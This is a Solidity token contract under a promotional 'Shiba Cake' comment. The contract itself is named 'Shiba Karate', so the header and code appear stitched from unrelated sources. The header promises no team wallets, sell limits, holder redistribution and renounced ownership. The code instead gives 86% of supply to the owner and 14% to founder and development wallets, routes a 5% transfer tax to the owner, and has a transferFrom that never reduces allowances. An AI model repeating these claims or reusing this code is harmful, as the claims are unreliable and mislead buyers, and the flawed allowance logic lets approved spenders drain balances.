// SPDX-License-Identifier: MIT 

/**
 * 

▒█▀▀▀█ █░░█ ░▀░ █▀▀▄ █▀▀█ 　 ▒█░▄▀ █▀▀█ █▀▀█ █▀▀█ ▀▀█▀▀ █▀▀ 
░▀▀▀▄▄ █▀▀█ ▀█▀ █▀▀▄ █▄▄█ 　 ▒█▀▄░ █▄▄█ █▄▄▀ █▄▄█ ░░█░░ █▀▀ 
▒█▄▄▄█ ▀░░▀ ▀▀▀ ▀▀▀░ ▀░░▀ 　 ▒█░▒█ ▀░░▀ ▀░▀▀ ▀░░▀ ░░▀░░ ▀▀▀
 * 
 *                   ▄              ▄
 *                  ▌▒█           ▄▀▒▌
 *                  ▌▒▒█        ▄▀▒▒▒▐
 *                 ▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐
 *               ▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐
 *             ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌
 *            ▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌
 *            ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐
 *           ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌
 *           ▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌
 *          ▌▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐
 *          ▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
 *          ▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐
 *           ▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌
 *           ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐
 *            ▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌
 *              ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀
 *                ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀
 *                   ▒▒▒▒▒▒▒▒▒▒▀▀
 
 If you're gonna eat that Shiba Burger and Shiba Ramen, you're gonna want some dessert. So get yourself some Shiba Cake!
We're launching at 11:30pm UTC 7th June 2021 to serve you up the evening snack.

We have a dynamic sell limit based on price impact and increasing sell cooldowns and redistribution taxes on consecutive sells, as a result; $SHIBCAKES is designed to reward holders and discourage dumping.

1. Bot and whale manipulation prevention: Buy limit and cooldown timer on buys to make sure no automated bots have a chance to snipe big portions of the pool.
2. No Team & Marketing wallet. 100% of the tokens will go directly to Uniswap for trading. 
3. No presale or team wallets allocated with tokens that can dump on the community. 

Token Information:
1. 1,000,000,000,000 Total Supply, but we're burning 20% of this imemdiately to create a super deflationary mechanism within the tokenomics!
3. Developer provides LP and it's locked with Unicrypt
4. We have made the fairest possible launch for everyone and pre-announced, so there is no early secret buyers! 
5. 0,2% transaction limit on launch - You can only buy 2000000000 $SHIBCAKES until it's lifted
6. Buy limit lifted to 1% of the supply 6 hours after launch, then the ownership of the token is immediately renounced
7. Sells limited to 3% of the Liquidity Pool, <3% price impact - KEEP WHALES OUT
8. Sell cooldown increases on consecutive sells, 5 sells within a 24 hours period are allowed
9. 2% redistribution to holders on all buys
10. 6% redistribution to holders on the first sell, increases 2x, 3x, 4x, 5x on consecutive sells
11. This redistribution mechanism works as expected above and benefits the holders much more than sellers!
12. 4% developer fee split within the team
 
 
 */

pragma solidity ^0.8.4;

interface IBEP20 {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract SHIBK is IBEP20 {
  
    // common addresses
    address private owner;
    address private developmentPot;
    address private foundersPot;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Shiba Karate";
    string public override symbol = "SHIBK";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint value);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address developmentAddress, address foundersAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        developmentPot = developmentAddress;
        foundersPot = foundersAddress;
        
        // split the tokens according to agreed upon percentages
        balances[developmentPot] =  totalSupply * 4 / 100;
        balances[foundersPot] = totalSupply * 10 / 100;
        
        balances[owner] = totalSupply * 86 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    // Get the address of the token's development pot
    function getDeveloper() public view returns(address) {
        return developmentPot;
    }
    
    // Get the address of the token's founder pot
    function getFounder() public view returns(address) {
        return foundersPot;
    }
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint taxTBD = value * 5 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - taxTBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        balances[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}